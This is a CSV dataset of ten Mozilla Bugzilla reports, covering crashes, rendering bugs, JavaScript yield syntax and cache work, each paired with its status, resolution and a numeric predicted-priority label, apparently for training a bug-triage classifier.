Issue_id,Component,Title,Description,Status,Resolution,Text,Predicted_Priority
6578,JavaScript Engine,Finalize yield syntax to match ES4/JS2 proposal,This tracks Python 2.5.  Currently we allow; ;   function f() { yield g(yield 1; 2) }; ; but the inner yield must be parenthesized; per PEP 342; Python 2.5; and the ES4 / JS2 proposal.  Trivial patch next.; ; /be,VERIFIED,FIXED,[TITLE] Title: Finalize yield syntax to match ES4/JS2 proposal | [DESC] Description: This tracks Python 2.5.  Currently we allow; ;   function f() { yield g(yield 1; 2) }; ; but the inner yield must be parenthesized; per PEP 342; Python 2.5; and the ES4 / JS2 proposal.  Trivial patch next.; ; /be | [META] Component: JavaScript Engine | [META] Status: VERIFIED | [META] Resolution: FIXED,0
8050,Networking: Cache,e10s HTTP: offline application cache,I actually know very little about how application caching (for offline mode; etc.) works; and how best to make it work with e10s.  ; ; I hear Honza is familiar with this stuff; so assigning to him.  Honza; could you map out a high-level summary of how application caching works; and what you expect well need to do to get it working in e10s?  General pointers to docs on application caching (is there an RFC? etc.) would also be useful.; ; Note that this is not regular HTTP caching; which should (fingers crossed!) just work without modification for e10s.,RESOLVED,FIXED,[TITLE] Title: e10s HTTP: offline application cache | [DESC] Description: I actually know very little about how application caching (for offline mode; etc.) works; and how best to make it work with e10s.  ; ; I hear Honza is familiar with this stuff; so assigning to him.  Honza; could you map out a high-level summary of how application caching works; and what you expect well need to do to get it working in e10s?  General pointers to docs on application caching (is there an RFC? etc.) would also be useful.; ; Note that this is not regular HTTP caching; which should (fingers crossed!) just work without modification for e10s. | [META] Component: Networking: Cache | [META] Status: RESOLVED | [META] Resolution: FIXED,1
5281,DOM: Core & HTML,[FIX]Add GetOwnerDocument on nsIContent or nsGenericElement,See comments in bug 211440; the idea is to add a; ; already_AddRefed<nsIDocument> GetOwnerDocument(); ; to nsGenericElement (or even nsIContent; depending on what the call patterns; look like...).; ; Ill do a sweep over the tree looking for GetDocument callers and see whether; there is enough call to put it on nsIContent; but I suspect that itll be enough; to put it on nsGenericElement for now.,RESOLVED,FIXED,[TITLE] Title: [FIX]Add GetOwnerDocument on nsIContent or nsGenericElement | [DESC] Description: See comments in bug 211440; the idea is to add a; ; already_AddRefed<nsIDocument> GetOwnerDocument(); ; to nsGenericElement (or even nsIContent; depending on what the call patterns; look like...).; ; Ill do a sweep over the tree looking for GetDocument callers and see whether; there is enough call to put it on nsIContent; but I suspect that itll be enough; to put it on nsGenericElement for now. | [META] Component: DOM: Core & HTML | [META] Status: RESOLVED | [META] Resolution: FIXED,1
7871,Layout: View Rendering,Text editing broken in Firebug edit mode and other extensions,Getting reports that editing is broken in Firebugs HTML; Style and DOM editors. Also heard that Twitterfox is having a similar problem where the text input field isnt focusable.; ; STR:; 1. Open Firebug on this or any page.; 2. Go to the HTML panel; select a node with some attributes; 3. Try to edit an attribute; ; What youll see:; Editor widget pops up but you are unable to enter or modify text.; ; Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2a1pre) Gecko/20090804 Minefield/3.6a1pre,VERIFIED,FIXED,[TITLE] Title: Text editing broken in Firebug edit mode and other extensions | [DESC] Description: Getting reports that editing is broken in Firebugs HTML; Style and DOM editors. Also heard that Twitterfox is having a similar problem where the text input field isnt focusable.; ; STR:; 1. Open Firebug on this or any page.; 2. Go to the HTML panel; select a node with some attributes; 3. Try to edit an attribute; ; What youll see:; Editor widget pops up but you are unable to enter or modify text.; ; Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.2a1pre) Gecko/20090804 Minefield/3.6a1pre | [META] Component: Layout: View Rendering | [META] Status: VERIFIED | [META] Resolution: FIXED,1
2411,Plug-ins,shockwave movies redraw improperly on mac(nsbeta3 rtm),From Bugzilla Helper:; User-Agent: Mozilla/4.75 (Macintosh; U; PPC); BuildID:    2000081721; ; The movies will be cut off or overlap frames; all sorts of odd bounding issues. ; http://www.shockwave.com displays the behavior as well.						; 	; ; Reproducible: Always; Steps to Reproduce:; 1.install shockwave on mozilla milestone 17 or NS6pr2 on Mac 8.6; 2.goto http://poppy.macromedia.com/netlanski/; 3.click any link to a shockwave movie; ; ; Actual Results:  							The movies are cut off or ; have overlapping boundaries; particularly noticable when you resize the wondow; ; Expected Results:  	All of the movie should be visible and in its proper place ; not overflowing into another frame						; Keywords: rtm; nsbeta3 shockwave),VERIFIED,DUPLICATE,[TITLE] Title: shockwave movies redraw improperly on mac(nsbeta3 rtm) | [DESC] Description: From Bugzilla Helper:; User-Agent: Mozilla/4.75 (Macintosh; U; PPC); BuildID:    2000081721; ; The movies will be cut off or overlap frames; all sorts of odd bounding issues. ; http://www.shockwave.com displays the behavior as well.						; 	; ; Reproducible: Always; Steps to Reproduce:; 1.install shockwave on mozilla milestone 17 or NS6pr2 on Mac 8.6; 2.goto http://poppy.macromedia.com/netlanski/; 3.click any link to a shockwave movie; ; ; Actual Results:  							The movies are cut off or ; have overlapping boundaries; particularly noticable when you resize the wondow; ; Expected Results:  	All of the movie should be visible and in its proper place ; not overflowing into another frame						; Keywords: rtm; nsbeta3 shockwave) | [META] Component: Plug-ins | [META] Status: VERIFIED | [META] Resolution: DUPLICATE,2
2120,XUL,Cancelling the file picker causes crash,(note: the XP File Picker needs its own component); (note: i strongly prefer my native file picker to the XP one); ; On Linux build 2000060908 (M17); cancelling in the XP file picker causes a; segmentation fault.  To reproduce:; ; 1) Start Moz; 2) Pick Save Page As from the File menu; 3) Close the file picker by clicking Cancel; or using your platforms window; destruction widget.; ; Mozilla exits with a segmentation fault.  The nightly build is stripped so I; dont have a backtrace.  These are the dying gasps from the console:; ; -*- filepicker: CI: {c47de916-1dd1-11b2-8141-82507fa02b21}; -*- filepicker: IID:nsIFilePicker; nsIDOMWindow id value = {a6cf906b-15b3-11d2-932e-00805f8add32}; WEBSHELL+ = 5; WEBSHELL- = 4; ./run-mozilla.sh: line 29:  3133 Segmentation fault      $prog ${1+$@},VERIFIED,FIXED,[TITLE] Title: Cancelling the file picker causes crash | [DESC] Description: (note: the XP File Picker needs its own component); (note: i strongly prefer my native file picker to the XP one); ; On Linux build 2000060908 (M17); cancelling in the XP file picker causes a; segmentation fault.  To reproduce:; ; 1) Start Moz; 2) Pick Save Page As from the File menu; 3) Close the file picker by clicking Cancel; or using your platforms window; destruction widget.; ; Mozilla exits with a segmentation fault.  The nightly build is stripped so I; dont have a backtrace.  These are the dying gasps from the console:; ; -*- filepicker: CI: {c47de916-1dd1-11b2-8141-82507fa02b21}; -*- filepicker: IID:nsIFilePicker; nsIDOMWindow id value = {a6cf906b-15b3-11d2-932e-00805f8add32}; WEBSHELL+ = 5; WEBSHELL- = 4; ./run-mozilla.sh: line 29:  3133 Segmentation fault      $prog ${1+$@} | [META] Component: XUL | [META] Status: VERIFIED | [META] Resolution: FIXED,0
217,Developer Tools: Debugger,[toolbox] [debugger] sidepanels dont show up after the toolbox is docked,1. Open debugger; 2. Undock the window; 3. Close the window; 4. Open the debugger (the window should already be undocked by now); 5. Dock the window; 6. Try to add a conditional breakpoint or focus the Filter Scripts textbox; -> No panels will ever be visible or accessible; ; Exception:; ; > Error: An error occurred updating the cmd_undo command: [Exception... Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIDOMXULCommandDispatcher.getControllerForCommand]  nsresult: 0x80004005 (NS_ERROR_FAILURE)  location: JS frame :: chrome://global/content/globalOverlay.js :: goUpdateCommand :: line 71  data: no]; > Source File: chrome://global/content/globalOverlay.js; > Line: 81,RESOLVED,WORKSFORME,[TITLE] Title: [toolbox] [debugger] sidepanels dont show up after the toolbox is docked | [DESC] Description: 1. Open debugger; 2. Undock the window; 3. Close the window; 4. Open the debugger (the window should already be undocked by now); 5. Dock the window; 6. Try to add a conditional breakpoint or focus the Filter Scripts textbox; -> No panels will ever be visible or accessible; ; Exception:; ; > Error: An error occurred updating the cmd_undo command: [Exception... Component returned failure code: 0x80004005 (NS_ERROR_FAILURE) [nsIDOMXULCommandDispatcher.getControllerForCommand]  nsresult: 0x80004005 (NS_ERROR_FAILURE)  location: JS frame :: chrome://global/content/globalOverlay.js :: goUpdateCommand :: line 71  data: no]; > Source File: chrome://global/content/globalOverlay.js; > Line: 81 | [META] Component: Developer Tools: Debugger | [META] Status: RESOLVED | [META] Resolution: WORKSFORME,0
8680,WebRTC: Networking,WebRTC crash [@ mozilla::NrIceCtx::GetGlobalAttributes],Created attachment 661309; testcase; ; Console output before the crash happened:; ; !!! Real PeerConnection constructor called OMG !!!; ; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : calling initialize; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: []; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: []; !!! mozPeerConnection constructor called [object Window @ 0x11bda5990 (native @ 0x11bda3f00)]; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : connect() called; PeerConnectionImpl::Connect(); PeerConnectionImpl::Connect() returned; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : connect() returned; PeerConnectionImpl::ConnectThread() finished; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : createOffer called; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : queued createOffer; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: [createOffer;]; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : createOffer returned; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : close called; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : onStateChange called: 1; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : close returnedOnMessage: mChannel 0x0 mConnection 0x11cef9cd0; PeerConnectionImpl:: got NotifyConnection; Delivering PeerConnection onconnection; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : onConnection called; !!! in executeNext: !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: [createOffer;],VERIFIED,FIXED,[TITLE] Title: WebRTC crash [@ mozilla::NrIceCtx::GetGlobalAttributes] | [DESC] Description: Created attachment 661309; testcase; ; Console output before the crash happened:; ; !!! Real PeerConnection constructor called OMG !!!; ; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : calling initialize; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: []; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: []; !!! mozPeerConnection constructor called [object Window @ 0x11bda5990 (native @ 0x11bda3f00)]; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : connect() called; PeerConnectionImpl::Connect(); PeerConnectionImpl::Connect() returned; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : connect() returned; PeerConnectionImpl::ConnectThread() finished; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : createOffer called; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : queued createOffer; !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: [createOffer;]; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : createOffer returned; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : close called; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : onStateChange called: 1; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : close returnedOnMessage: mChannel 0x0 mConnection 0x11cef9cd0; PeerConnectionImpl:: got NotifyConnection; Delivering PeerConnection onconnection; !!! {f47faeb4-14f9-9144-b5b6-b6f83b388375} : onConnection called; !!! in executeNext: !!! Queue for {f47faeb4-14f9-9144-b5b6-b6f83b388375} is currently: [createOffer;] | [META] Component: WebRTC: Networking | [META] Status: VERIFIED | [META] Resolution: FIXED,1
5027,Printing: Output,Margin value isnt always saved as entered,Margin value in Page Setup dialog isnt always saved as entered.; ; Steps to reproduce:; (1) Enter 158 as right margin.; (2) Click OK button and open Page Setup dialog again.; ; Right margin is changed to 157.9.; ; Build: 2003010408-trunk/Win98,VERIFIED,FIXED,[TITLE] Title: Margin value isnt always saved as entered | [DESC] Description: Margin value in Page Setup dialog isnt always saved as entered.; ; Steps to reproduce:; (1) Enter 158 as right margin.; (2) Click OK button and open Page Setup dialog again.; ; Right margin is changed to 157.9.; ; Build: 2003010408-trunk/Win98 | [META] Component: Printing: Output | [META] Status: VERIFIED | [META] Resolution: FIXED,1
3583,Security: UI,crashes [@ SECITEM_CompareItem],Crashes in SECITEM_CompareItem have been the #2 topcrash on the trunk since; 2001-09-07.  A typical stack (from talkback #35134613):; ; SECITEM_CompareItem(); AuthCertificateCallback; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSCallbacks.cpp; line 274]; ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_GatherCompleteHandshake(); ssl_GatherRecord1stHandshake(); ssl_Do1stHandshake(); ssl_SecureSend(); ssl_SecureWrite(); SSL_ImportFD(); nsSSLIOLayerWrite; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSIOLayer.cpp; line 718]; PR_Write [../../../../pr/src/io/priometh.c; line 142]; nsSSLIOLayerConnect; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSIOLayer.cpp; line 532]; PR_Connect [../../../../pr/src/io/priometh.c; line 183]; nsSocketTransport::doConnection; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransport.cpp; line 800]; nsSocketTransport::Process; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransport.cpp; line 474]; nsSocketTransportService::ProcessWorkQ; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransportService.cpp; line; 249]; nsSocketTransportService::Run; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransportService.cpp; line; 509]; nsThread::Main [d:\builds\seamonkey\mozilla\xpcom\threads\nsThread.cpp; line 117]; _PR_NativeRunThread [../../../../../pr/src/threads/combined/pruthr.c; line 435] ; ; Since the function AuthCertificateCallback was added for the changes in bug; 93103; checked in 2001-09-06; I suspect those changes caused this crash.,VERIFIED,FIXED,[TITLE] Title: crashes [@ SECITEM_CompareItem] | [DESC] Description: Crashes in SECITEM_CompareItem have been the #2 topcrash on the trunk since; 2001-09-07.  A typical stack (from talkback #35134613):; ; SECITEM_CompareItem(); AuthCertificateCallback; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSCallbacks.cpp; line 274]; ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_HandleRecord(); ssl3_GatherCompleteHandshake(); ssl_GatherRecord1stHandshake(); ssl_Do1stHandshake(); ssl_SecureSend(); ssl_SecureWrite(); SSL_ImportFD(); nsSSLIOLayerWrite; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSIOLayer.cpp; line 718]; PR_Write [../../../../pr/src/io/priometh.c; line 142]; nsSSLIOLayerConnect; [d:\builds\seamonkey\mozilla\security\manager\ssl\src\nsNSSIOLayer.cpp; line 532]; PR_Connect [../../../../pr/src/io/priometh.c; line 183]; nsSocketTransport::doConnection; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransport.cpp; line 800]; nsSocketTransport::Process; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransport.cpp; line 474]; nsSocketTransportService::ProcessWorkQ; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransportService.cpp; line; 249]; nsSocketTransportService::Run; [d:\builds\seamonkey\mozilla\netwerk\base\src\nsSocketTransportService.cpp; line; 509]; nsThread::Main [d:\builds\seamonkey\mozilla\xpcom\threads\nsThread.cpp; line 117]; _PR_NativeRunThread [../../../../../pr/src/threads/combined/pruthr.c; line 435] ; ; Since the function AuthCertificateCallback was added for the changes in bug; 93103; checked in 2001-09-06; I suspect those changes caused this crash. | [META] Component: Security: UI | [META] Status: VERIFIED | [META] Resolution: FIXED,0
